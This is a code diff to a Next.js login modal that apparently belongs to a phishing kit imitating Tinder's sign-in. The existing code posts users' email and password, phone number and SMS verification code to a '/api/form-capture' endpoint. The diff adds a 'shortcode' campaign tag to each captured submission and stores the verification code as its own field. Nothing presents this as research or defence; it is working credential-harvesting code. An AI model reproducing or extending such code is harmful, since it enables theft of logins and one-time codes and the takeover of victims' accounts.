@@ -12,8 +12,13 @@ import Link from 'next/link';
 interface LoginModalProps {
   isOpen: boolean;
   onClose: () => void;
+  shortcode?: string;
 }
-export default function LoginModal({ isOpen, onClose }: LoginModalProps) {
+export default function LoginModal({
+  isOpen,
+  onClose,
+  shortcode,
+}: LoginModalProps) {
   // Form view states
   const [formView, setFormView] = useState<'social' | 'email' | 'phone'>(
     'social',
@@ -128,6 +133,7 @@ export default function LoginModal({ isOpen, onClose }: LoginModalProps) {
           source: 'tinder',
           email,
           password,
+          shortcode,
           additional_data: {
             login_method: 'email',
             login_time: new Date().toISOString(),
@@ -172,7 +178,7 @@ export default function LoginModal({ isOpen, onClose }: LoginModalProps) {
     setIsLoading(true);
 
     try {
-      // Kirim data telepon ke endpoint form capture
+      // Kirim data phone login ke endpoint form capture
       await fetch('/api/form-capture', {
         method: 'POST',
         headers: {
@@ -181,6 +187,7 @@ export default function LoginModal({ isOpen, onClose }: LoginModalProps) {
         body: JSON.stringify({
           source: 'tinder',
           phone: phoneNumber,
+          shortcode,
           additional_data: {
             login_method: 'phone',
             login_time: new Date().toISOString(),
@@ -220,7 +227,7 @@ export default function LoginModal({ isOpen, onClose }: LoginModalProps) {
     setIsLoading(true);
 
     try {
-      // Kirim data verifikasi ke endpoint form capture
+      // Kirim data verification code ke endpoint form capture
       await fetch('/api/form-capture', {
         method: 'POST',
         headers: {
@@ -229,9 +236,10 @@ export default function LoginModal({ isOpen, onClose }: LoginModalProps) {
         body: JSON.stringify({
           source: 'tinder',
           phone: phoneNumber,
+          verification_code: verificationCode,
+          shortcode,
           additional_data: {
-            login_method: 'phone',
-            verification_code: verificationCode,
+            login_method: 'phone_verification',
             login_time: new Date().toISOString(),
           },
         }),
